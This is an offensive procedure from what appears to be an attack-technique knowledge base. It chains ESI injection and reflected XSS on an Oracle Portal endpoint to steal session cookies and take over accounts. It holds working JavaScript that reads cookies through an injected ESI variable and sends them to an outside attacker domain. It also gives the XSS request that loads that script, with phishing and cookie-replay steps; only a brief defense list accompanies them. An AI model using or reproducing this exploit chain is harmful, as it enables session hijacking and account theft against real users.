---
id: proc-chain-esi-xss-ato
tags:
  - esi-injection
  - xss
  - cookie-theft
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:12.042Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Chain ESI Injection with XSS to Steal and Exfiltrate Cookies

## Summary

This procedure chains ESI injection for cookie leakage with reflected XSS to execute JavaScript that fetches the leaked data, parses it, and exfiltrates to an attacker server, achieving remote account takeover via session hijacking.

## Description

By injecting an XSS payload that loads an external script, the JavaScript fetches the ESI-vulnerable endpoint, extracts cookies from the response's 'x61_ms' element using delimiters, and sends them via a GET request to the attacker's domain. This automates theft in a single victim interaction, targeting Oracle Portal. Potential for SSRF if ESI allows internal access. Requires hosting the JS file and crafting a phishing link.

## Requirements

1. Control of an external server (e.g., https://www.jr0ch17.com) to host JS and receive data
2. Valid ESI injection endpoint and XSS-vulnerable show_tree endpoint
3. Victim to visit the malicious show_tree URL

## Defense

Defensive measures and detection strategies:

- Patch ESI and XSS vulns: Sanitize inputs and encode outputs comprehensively
- Implement strict CSP to block external script loads and inline JS
- Monitor for cross-origin fetches from internal endpoints and anomalous outbound requests to unknown domains
- Use HttpOnly and Secure flags on cookies, with short expiration times

## Objectives

1. Automate cookie theft by combining server-side leak with client-side execution
2. Exfiltrate data to attacker without direct access
3. Hijack victim sessions for account takeover

## Instructions

### Step 1: Prepare External JavaScript for Exfiltration

**Context**: Create and host a JS file that fetches the ESI endpoint, parses cookies, and sends them outbound.

**JavaScript Code** (host at https://www.jr0ch17.com/hta3.js):

```javascript
function stealCookies() {
  fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol')
    .then(response => response.text())
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const cookiesElement = doc.querySelector('#x61_ms');
      if (cookiesElement) {
        const match = cookiesElement.innerText.match(/lol(.*?)lol/);
        if (match) {
          const cookies = match[1];
          fetch('https://www.jr0ch17.com/ato?cookies=' + encodeURIComponent(cookies));
        }
      }
    });
}
stealCookies();
```

> Upload to your server. Expected: Script ready to load and execute on injection.

### Step 2: Inject XSS Payload to Load the Script

**Context**: Deliver the XSS via the 'title' parameter to trigger the external JS in the victim's browser.

**Payload**:

```http
GET /portal/pls/portal/PORTAL.wwexp_render.show_tree?title=</title><script src="https://www.jr0ch17.com/hta3.js"></script> HTTP/1.1
Host: ████████
```

> Send via phishing or direct link. Expected output: JS loads, fetches ESI response, extracts cookies, and exfils to your /ato endpoint.

### Step 3: Receive and Use Stolen Cookies

**Context**: Monitor your server logs for the exfiltrated data and test session hijacking.

Set up a simple endpoint on your server to log GET /ato requests.

> Expected: Logs show query param with cookies, e.g., 'cookies=JSESSIONID%3Dabc123%3B%20AUTH_TOKEN%3Dxyz456'. Use these in your browser's cookie store to access the victim's account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[esi-injection]]
- [[xss]]
- [[cookie-theft]]
- [[account-takeover]]
